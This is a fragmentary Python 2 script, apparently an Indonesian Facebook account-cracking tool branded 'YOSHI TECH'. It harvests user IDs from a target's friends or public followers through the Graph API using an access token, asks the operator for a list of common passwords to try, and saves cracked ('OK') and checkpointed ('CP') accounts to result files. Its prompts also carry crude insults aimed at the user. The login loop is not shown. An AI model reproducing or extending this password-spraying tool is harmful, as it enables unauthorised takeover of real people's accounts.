...
\x1b[1;97m   /  |/  / __ )/ ____/ |\x1b[1;96m® \x1b[1;97mAUTHOR  \x1b[1;91m: \x1b[1;90mYOSHI TECH
\x1b[1;97m  / /|_/ / __  / /_     |\x1b[1;96m® \x1b[1;97mFACEBOOK \x1b[1;91m: \x1b[1;92mYOSHI
\x1b[1;97m / /  / / /_/ / __/     |\x1b[1;96m® \x1b[1;97mGithub  \x1b[1;91m: \x1b[1;97m/Zuck-Ker
...
#    print("[5] Dump ID Dari Teman")
#    print("[6] Dump ID Dari Publik")
#    print("[7] Dump ID Daro Total followers")
#    print("[8] Mulai Crack [YOSHI]")
...
def pilih_menumbasic():
    ...
    if ask == '':
        ...
        if  status == 'offline' or status =='Offline':
             ...
             print("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Isi \x1b[1;92m'me' \x1b[1;97mJika Ingin Crack Dari Daftar Teman")
        idt = raw_input('\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Masukan ID Target nyet \x1b[1;97m:\x1b[1;92m ')
        print ""
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
...
def manualmbasic():
    print '\n[•] Buat Password Anjing Contoh : bismillah,sayang,rahasia'
    pw = raw_input('[?] Buat Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar goblok, gak Boleh Kosong!')
    print '\n[•] Hasil OK Disimpan Di : Hasil/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[•] Hasil CP Disimpan Di : Hasil/CP-%s-%s-%s.txt' % (ha, op, ta)
    print("\n[!] untuk berhenti tekan CTRL lalu tekan Z ")
    print("")
